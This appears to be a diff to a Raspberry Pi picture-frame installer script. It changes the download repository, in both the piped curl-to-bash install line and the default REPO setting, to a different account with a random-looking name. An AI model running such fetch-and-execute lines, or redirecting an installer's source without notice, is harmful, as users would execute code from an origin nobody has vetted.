@@ -2,7 +2,7 @@
 #
 # picframe3 installer for Raspberry Pi OS (Bookworm / Trixie, 64-bit).
 #
-#   curl -fsSL https://raw.githubusercontent.com/sapnho/Digital-Picture-Frame-Pi-2026/main/packaging/install.sh | bash
+#   curl -fsSL https://raw.githubusercontent.com/ydj97szr4d-sudo/Raspi-Pic-frame-2026/main/packaging/install.sh | bash
 #
 # Or, from an unpacked source tree:   bash packaging/install.sh
 #
@@ -48,7 +48,7 @@ else
   die "sudo is not installed and you are not root"
 fi
 
-REPO="${PICFRAME_REPO:-sapnho/Digital-Picture-Frame-Pi-2026}"
+REPO="${PICFRAME_REPO:-ydj97szr4d-sudo/Raspi-Pic-frame-2026}"
 BRANCH="${PICFRAME_BRANCH:-main}"
 ARCHIVE="${PICFRAME_ARCHIVE:-https://github.com/$REPO/archive/refs/heads/$BRANCH.tar.gz}"
 
